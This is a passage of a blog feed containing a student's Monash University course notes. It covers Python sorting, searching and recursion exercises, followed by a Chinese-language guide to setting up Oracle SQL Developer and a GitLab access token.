iteration: Searching smallest value <span class="keyword">for</span> index 3</span><br><span class="line">1,2,3|5,4 [5 is the smallest item so far]</span><br><span class="line">1,2,3|5,4 [4 is the smallest item so far]</span><br><span class="line"></span><br><span class="line">Swap items at index 3 and index 4.</span><br><span class="line">1,2,3,4|5</span><br><span class="line">Number of comparisons: 1(excluding target index)</span><br><span class="line">First 4 items (1,2,3,4) are sorted. The remaining item is also sorted.</span><br></pre></td></tr></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">selection_sort</span>(<span class="params">a_list</span>):</span><br><span class="line">    sorted_list = a_list[:] <span class="comment"># make a copy of the original list</span></span><br><span class="line">    <span class="keyword">for</span> <span class="built_in">iter</span> <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(sorted_list) - <span class="number">1</span>):</span><br><span class="line">        smallest_idx = <span class="built_in">iter</span></span><br><span class="line">        <span class="comment"># search for index of smallest value behind</span></span><br><span class="line">        <span class="keyword">for</span> index <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">iter</span> + <span class="number">1</span>, <span class="built_in">len</span>(sorted_list)):</span><br><span class="line">            <span class="comment"># if current item is smaller than current smallest item, update index of smallest item</span></span><br><span class="line">            <span class="keyword">if</span> sorted_list[index] &lt; sorted_list[smallest_idx]:</span><br><span class="line">                smallest_idx = index</span><br><span class="line">        sorted_list[<span class="built_in">iter</span>], sorted_list[smallest_idx] = sorted_list[smallest_idx], sorted_list[<span class="built_in">iter</span>] <span class="comment"># swap target index with the smallest index behind</span></span><br><span class="line">    <span class="keyword">return</span> sorted_list</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(selection_sort([<span class="number">5</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">2</span>]))</span><br></pre></td></tr></table></figure></div><h2 id="插入排序"><a href="#插入排序" class="headerlink" title="插入排序"></a>插入排序</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">5,1,7,2</span><br><span class="line">red item: target</span><br><span class="line">-----------</span><br><span class="line">1st iteration: Finding new index <span class="keyword">for</span> item at index 1</span><br><span class="line">1,5,7,2 [Swap index 0 and 1]</span><br><span class="line">1,5|7,2</span><br><span class="line">First 2 items (1,5) are sorted.</span><br><span class="line">-----------</span><br><span class="line">2nd iteration: Finding new index <span class="keyword">for</span> item at index 2</span><br><span class="line">1,5,7|2 [All previous item of 7 is smaller, no swaps]</span><br><span class="line">First 3 items (1,2,7) are sorted.</span><br><span class="line">-----------</span><br><span class="line">3rd iteration: Finding new index <span class="keyword">for</span> item at index 3</span><br><span class="line">1,5,2,7 [Swap 2 and 7]</span><br><span class="line">1,2,5,7 [Swap 2 and 5]</span><br><span class="line">All items are sorted.</span><br></pre></td></tr></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">insertion_sort</span>(<span class="params">a_list</span>):</span><br><span class="line">    sorted_list = a_list[:] <span class="comment"># make a copy of the original list</span></span><br><span class="line">    <span class="keyword">for</span> <span class="built_in">iter</span> <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(sorted_list)):</span><br><span class="line">        target_idx = <span class="built_in">iter</span></span><br><span class="line">        <span class="comment"># swap with previous item until the previous item is smaller</span></span><br><span class="line">        <span class="comment"># or until we reach start of list</span></span><br><span class="line">        <span class="keyword">while</span> target_idx &gt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> sorted_list[target_idx] &lt; sorted_list[target_idx - <span class="number">1</span>]:</span><br><span class="line">                sorted_list[target_idx], sorted_list[target_idx - <span class="number">1</span>] = sorted_list[target_idx - <span class="number">1</span>], sorted_list[target_idx]</span><br><span class="line">                target_idx -= <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> sorted_list</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(insertion_sort([<span class="number">5</span>,<span class="number">1</span>,<span class="number">7</span>,<span class="number">2</span>]))</span><br></pre></td></tr></table></figure></div><hr><h2 id="Linear-Search-线性查找"><a href="#Linear-Search-线性查找" class="headerlink" title="Linear Search 线性查找"></a>Linear Search 线性查找</h2><p>Write a Python function <code>linear_search_tuples(a_list,query)</code> that:</p><p>accepts a list of tuples with 2 items in each of a tuple and only searches whether query exists in the second item of any of the tuples.</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">linear_search_tuples</span>(<span class="params">a_list, query</span>):</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> a_list:</span><br><span class="line">        <span class="keyword">if</span> item[<span class="number">1</span>] == query:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(linear_search_tuples([(<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>),(<span class="number">2</span>,<span class="string">&#x27;c&#x27;</span>),(<span class="string">&#x27;abc&#x27;</span>,<span class="string">&#x27;ee&#x27;</span>)],<span class="string">&#x27;c&#x27;</span>))</span><br><span class="line"><span class="comment"># True</span></span><br><span class="line"><span class="built_in">print</span>(linear_search_tuples([(<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>),(<span class="number">2</span>,<span class="string">&#x27;c&#x27;</span>),(<span class="string">&#x27;abc&#x27;</span>,<span class="string">&#x27;ee&#x27;</span>)],<span class="string">&#x27;abc&#x27;</span>)) </span><br><span class="line"><span class="comment"># False</span></span><br></pre></td></tr></table></figure></div><hr><h1 id="week11"><a href="#week11" class="headerlink" title="week11"></a>week11</h1><h2 id="Recursion"><a href="#Recursion" class="headerlink" title="Recursion"></a>Recursion</h2><h3 id="Divide-and-Conquer"><a href="#Divide-and-Conquer" class="headerlink" title="Divide-and-Conquer:"></a>Divide-and-Conquer:</h3><ul><li>Solving a complex problem by breaking it into <strong>smaller manageable sub-problems</strong> </li><li>Sub-problems can then be solved in a similar way (with the same solution)</li><li><strong>Sub-solutions are then combined to produce the final solution for the original problem</strong></li></ul><h3 id="Recursion-1"><a href="#Recursion-1" class="headerlink" title="Recursion:"></a>Recursion:</h3><ul><li>A <font color="blue">divide-and-conquer</font> approach for solving computational problems</li><li>Each problem is “recursively” <font color="blue">decomposed into sub-problems</font> (which have the same properties the original problem but smaller in size)<br> When the sub-problems have reached the <font color="blue">simplest form</font>, i.e. a <font color="blue">known solution</font> can be defined</li><li>The <font color="blue">known solutions of these sub-problems are then recomposed</font> together to produce the solution of the original problem<br><strong><font color="red">Answer:</font></strong></li></ul><h3 id="Benefits-Advantages"><a href="#Benefits-Advantages" class="headerlink" title="Benefits (Advantages):"></a>Benefits (Advantages):</h3><ul><li>Recursion allows for <font color="blue">easier paprallel processing</font> as function calls can be passed to other CPUs</li><li>Recurision can <font color="blue">be used to follow logic</font> where the number of steps is not known, just the end state that the code is looking for.</li><li><font color="blue">Certain problems</font> lend themselves well to recurision. It takes <font color="blue">practise</font> to realise what problems can use recurision well</li></ul><h3 id="Detriments-Disadvantages"><a href="#Detriments-Disadvantages" class="headerlink" title="Detriments (Disadvantages):"></a>Detriments (Disadvantages):</h3><ul><li>Recurision can be quite to <font color="red">conceptualise</font></li><li>Very easy to create an <font color="red">infinite loop</font></li><li><font color="red">Memory intensive</font> if using tail Recursion</li><li>Can only be used in <font color="red">program languages</font> with functions</li></ul><p><strong><font color="red">Task:</font></strong> Find all the <code>3 cases</code> for the following code, and answer what the code does:    </p><p><strong>A:</strong></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">foo</span> (b):</span><br><span class="line">    <span class="keyword">return</span> aux_foo(b,<span class="number">0</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aux_foo</span>(<span class="params">b,a</span>):</span><br><span class="line">    <span class="keyword">if</span> b == a:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span> + aux_foo(b-<span class="number">1</span>,a)</span><br></pre></td></tr></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> b == a: <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">Recursive Case aux_foo(b-<span class="number">1</span>, a)</span><br><span class="line">Convergence Case b-<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">input</span> value: b=<span class="number">2</span></span><br><span class="line">Return aux_foo(<span class="number">2</span>-<span class="number">1</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">What <span class="keyword">is</span> aux_foo(<span class="number">1</span>,<span class="number">0</span>)?</span><br><span class="line"><span class="number">1</span> != <span class="number">0</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span> + aux_foo(<span class="number">1</span>-<span class="number">1</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">what <span class="keyword">is</span> aux_foo(<span class="number">0</span>,<span class="number">0</span>)?</span><br><span class="line"><span class="number">0</span> == <span class="number">0</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span></span><br></pre></td></tr></table></figure></div><p><strong>B:</strong></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">fun</span>(<span class="params">a, b</span>): </span><br><span class="line">    <span class="keyword">if</span> (b == <span class="number">0</span>): </span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span> </span><br><span class="line">    <span class="keyword">if</span> (b % <span class="number">2</span> == <span class="number">0</span>): </span><br><span class="line">        <span class="keyword">return</span> fun(a*a, b//<span class="number">2</span>)    </span><br><span class="line">    <span class="keyword">return</span> fun(a*a, b//<span class="number">2</span>)*a      </span><br><span class="line">```    </span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line">Base <span class="keyword">case</span>:</span><br><span class="line"><span class="keyword">if</span> b == <span class="number">0</span>: <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">Recursive Case</span><br><span class="line">fun(a*a, b//<span class="number">2</span>)</span><br><span class="line">Convergence Case b//<span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">input</span> value: a=<span class="number">2</span>, b=<span class="number">2</span></span><br><span class="line">b!=<span class="number">0</span></span><br><span class="line">b%<span class="number">2</span>==<span class="number">0</span> <span class="keyword">return</span> fun(a*a, b//<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">What <span class="keyword">is</span> fun(<span class="number">4</span>,<span class="number">1</span>)?</span><br><span class="line">b!=<span class="number">0</span></span><br><span class="line">b%<span class="number">2</span>!=<span class="number">0</span></span><br><span class="line"><span class="keyword">return</span> fun(a*a, b//<span class="number">2</span>)*a</span><br><span class="line"></span><br><span class="line">what <span class="keyword">is</span> fun(<span class="number">16</span>,<span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span></span><br></pre></td></tr></table></figure></div><h2 id="Fibonacci-Series"><a href="#Fibonacci-Series" class="headerlink" title="Fibonacci Series"></a>Fibonacci Series</h2><p>The sequence of numbers starts with [1,1]</p><h3 id="calculates-the-Nth-Fibonacci-number-iteratively"><a href="#calculates-the-Nth-Fibonacci-number-iteratively" class="headerlink" title="calculates the Nth Fibonacci number iteratively"></a>calculates the Nth Fibonacci number iteratively</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">iter_fib</span>(<span class="params">N</span>):</span><br><span class="line">    previous = <span class="number">1</span></span><br><span class="line">    total = <span class="number">1</span></span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> i &lt; N:</span><br><span class="line">        temp = total</span><br><span class="line">        total += previous</span><br><span class="line">        previous = temp</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> total </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        <span class="built_in">print</span>(iter_fib(i),end = <span class="string">&quot;, &quot;</span>)</span><br></pre></td></tr></table></figure></div><h3 id="calculates-the-Nth-Fibonacci-number-recursively"><a href="#calculates-the-Nth-Fibonacci-number-recursively" class="headerlink" title="calculates the Nth Fibonacci number recursively"></a>calculates the Nth Fibonacci number recursively</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">rec_fib</span>(<span class="params">N</span>):</span><br><span class="line">    <span class="keyword">if</span> N == <span class="number">0</span> <span class="keyword">or</span> N == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> rec_fib(N-<span class="number">1</span>) + rec_fib(N-<span class="number">2</span>)</span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        <span class="built_in">print</span>(rec_fib(i),end = <span class="string">&quot;, &quot;</span>)</span><br></pre></td></tr></table></figure></div><h2 id="Sum-of-Numbers"><a href="#Sum-of-Numbers" class="headerlink" title="Sum of Numbers"></a>Sum of Numbers</h2><p>Given a number, return the total sum of that number multiplied by every number between 1 and 10. Do not use the <code>sum()</code> built-in function.</p><p>Example:<br>total_sum(1) ➞ 55<br>1 x 1 + 1 x 2 + 1 x 3 …… 1 x 9 + 1 x 10 &#x3D; 55</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">total_sum</span>(<span class="params">n, ten = <span class="number">10</span></span>):</span><br><span class="line">    <span class="keyword">if</span> ten == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> ten*n</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> ten*n + total_sum(n, ten-<span class="number">1</span>)</span><br></pre></td></tr></table></figure></div><h2 id="Recursive-Linear-Search"><a href="#Recursive-Linear-Search" class="headerlink" title="Recursive Linear Search"></a>Recursive Linear Search</h2><p>Write a python code to implement a Linear Search that is recursive.</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">rec_lin_search</span>(<span class="params">li,item</span>):</span><br><span class="line">    <span class="keyword">return</span> aux_rec_lin_search(<span class="number">0</span>,li,item)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aux_rec_lin_search</span>(<span class="params">i,li,item</span>):</span><br><span class="line">    <span class="keyword">if</span> i == <span class="built_in">len</span>(li):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> li[i] == item:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> aux_rec_lin_search(i+<span class="number">1</span>,li,item) </span><br><span class="line"></span><br><span class="line">li = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rec_lin_search(li,<span class="number">1</span>))</span><br></pre></td></tr></table></figure></div>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\yakko117\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\yakko117\assets\js\A</summary>
      
    
    
    
    <category term="Monash笔记" scheme="https://manayakko.github.io/yakko117/categories/Monash%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="Monash Cs" scheme="https://manayakko.github.io/yakko117/tags/Monash-Cs/"/>
    
  </entry>
  
  <entry>
    <title>Monash Courses 2023S1 FIT9132</title>
    <link href="https://manayakko.github.io/yakko117/2023/02/28/MonashCs9132/"/>
    <id>https://manayakko.github.io/yakko117/2023/02/28/MonashCs9132/</id>
    <published>2023-02-28T06:02:16.129Z</published>
    <updated>2023-05-02T03:20:33.159Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><h1 id="FIT9132-SQL"><a href="#FIT9132-SQL" class="headerlink" title="FIT9132 SQL"></a>FIT9132 SQL</h1><p> <a href="https://handbook.monash.edu/2023/units/FIT9132">学校handbook</a><br> <a href="https://docs.oracle.com/en/database/oracle/sql-developer/22.2/books.html">官方guidebook</a></p><h1 id="week1"><a href="#week1" class="headerlink" title="week1"></a>week1</h1><p>安装 SQL Developer <a href="https://lms.monash.edu/pluginfile.php/15800135/mod_label/intro/OracleClientSoftwareSQLDeveloper_S1_23.pdf?time=1677133551842">install guide</a> 和VPN，开始摸鱼</p><p><a href="https://lms.monash.edu/pluginfile.php/15800233/mod_resource/content/37/FIT9132_AppliedSession_1-2023S1.pdf">课堂pdf指导，推荐仔细看</a></p><h2 id="sql-设置注意事项"><a href="#sql-设置注意事项" class="headerlink" title="sql 设置注意事项"></a>sql 设置注意事项</h2><p>在你安装的路径找到 <code>sqldeveloper.exe</code>， 右键属性，更改高DPI, 然后下面的选项勾上， 选择system or 系统<br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202302280823439.jpg" data-fancybox="group" data-caption="属性设置" class="fancybox"><img alt="属性设置" title="属性设置" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202302280823439.jpg" class="lazyload"></a></p><p>然后是语言设置，如果是需要中文，在安装 <code>sqldeveloper</code> 的文件夹 找到 <code>ide</code> 文件，打开进入 <code>bin</code> 文件， 找到 <code>ide.conf</code> 右键用文本编辑器打开，比如leadpad notepad++ 或者是记事本， 在<code>ide.conf</code>最后加入以下代码，保存退出重新进入sql软件即可。</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202302280845835.jpg" data-fancybox="group" data-caption="切换语言" class="fancybox"><img alt="切换语言" title="切换语言" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202302280845835.jpg" class="lazyload"></a></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">html</div></div><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">切换英文</span><br><span class="line">AddVMOption -Duser.language=en</span><br><span class="line">AddVMOption -Duser.country=AU</span><br><span class="line"></span><br><span class="line">切换中文</span><br><span class="line">AddVMOption -Duser.language=zh</span><br><span class="line">AddVMOption -Duser.country=CN</span><br></pre></td></tr></table></figure></div><p>然后是<strong>系统preference设置</strong><br>在 <code>工具 tools</code> 找到最下面的选项 preference 点开，找到 <code>Code Editor</code> 点开左边加号进行展开，选到 <code>Line Gutter</code>， 勾选 <code>Show Line Numbers</code>  </p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202302280846337.jpg" data-fancybox="group" data-caption="preference" class="fancybox"><img alt="preference" title="preference" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202302280846337.jpg" class="lazyload"></a></p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202302280846994.jpg" data-fancybox="group" data-caption="preference_1" class="fancybox"><img alt="preference_1" title="preference_1" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202302280846994.jpg" class="lazyload"></a></p><p>然后点开下面的 <code>format</code>， 展开选择 <code>Advanced Format</code>， 找到 <code>Max char line width</code> 改成80(默认128)</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202302280846311.jpg" data-fancybox="group" data-caption="preference_2" class="fancybox"><img alt="preference_2" title="preference_2" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202302280846311.jpg" class="lazyload"></a></p><p>后续几个照着pdf调设置就行了</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202302281009563.jpg" data-fancybox="group" data-caption="preference_3" class="fancybox"><img alt="preference_3" title="preference_3" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202302281009563.jpg" class="lazyload"></a></p><h2 id="git-设置"><a href="#git-设置" class="headerlink" title="git 设置"></a>git 设置</h2><p><a href="https://git.infotech.monash.edu/">Monash Gitlab</a><br><em>(this uses Monash SAML login - Monash single sign-on)</em><br>进入网站，点击页面右上角头像栏，展开有<code>Preferences</code>，<br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202302281016779.jpg" data-fancybox="group" data-caption="week1_git1" class="fancybox"><img alt="week1_git1" title="week1_git1" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202302281016779.jpg" class="lazyload"></a></p><p>点开会跳转到新页面，找到 <code>Access Tokens</code><br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202302281018568.jpg" data-fancybox="group" data-caption="undefined" class="fancybox"><img data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202302281018568.jpg" class="lazyload"></a></p><p><code>Token name</code> 随便输入，<code>Expiration date</code> 可以设置远一点，至少比本学期长一点 &#x3D; &#x3D;;<br>勾选 <code>Api</code> 选项，然后就 <code>create token</code> 就行了，<strong>记得要把生成的token保存下来，后面要用</strong><br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202302281021025.jpg" data-fancybox="group" data-caption="Fit9132token" class="fancybox"><img alt="Fit9132token" title="Fit9132token" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202302281021025.jpg" class="lazyload"></a></p><h2 id="使用-SQL-Developer-设置local-repo"><a href="#使用-SQL-Developer-设置local-repo" class="headerlink" title="使用 SQL Developer 设置local repo"></a>使用 SQL Developer 设置local repo</h2><p>首先确保gitlab 账号和token都已经设置好了<br>在校内就直连wifi，在家就用VPN，然后在磁盘设置好一个sql工作环境，比如新建文件夹，设置文件夹名为<code>FIT9132_workspace</code>，打开<code>Sql developer</code></p><p>然后在学校网站找到设置需求，步骤如下<br><strong><font color="red">Moodle–&gt; FIT9132–&gt; week1–&gt; Oracle Connection Details</font></strong></p><p>然后进行操作建立本地数据库，点击 <strong><font color="green">绿色加号</font></strong></p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202303010757431.jpg" data-fancybox="group" data-caption="创建sql" class="fancybox"><img alt="创建sql" title="创建sql" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202303010757431.jpg" class="lazyload"></a></p><p>然后按照 <code>Oracle Connection Details</code> 所给予的内容，进行填写账号密码 <strong>(PS:在校内请连校内wifi，在其他地方请连VPN)</strong></p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202303010758631.jpg" data-fancybox="group" data-caption="填入信息" class="fancybox"><img alt="填入信息" title="填入信息" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202303010758631.jpg" class="lazyload"></a></p><p>确认输入无误之后，点击 <code>test</code> ，连接成功会消失进程，点击 <code>Connect</code> 即可。</p><h2 id="修改sql密码"><a href="#修改sql密码" class="headerlink" title="修改sql密码"></a>修改sql密码</h2><p>连接好数据库后，修改密码请输入大写的 <code>PASSWORD</code>，然后点击运行即可</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202303010808255.jpg" data-fancybox="group" data-caption="passwd_1" class="fancybox"><img alt="passwd_1" title="passwd_1" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202303010808255.jpg" class="lazyload"></a></p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202303010809471.jpg" data-fancybox="group" data-caption="passwd_2" class="fancybox"><img alt="passwd_2" title="passwd_2" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202303010809471.jpg" class="lazyload"></a></p><h2 id="Review"><a href="#Review" class="headerlink" title="Review"></a>Review</h2><ul><li>What is data independence, and why is it lacking in file systems?</li></ul><p><strong>data 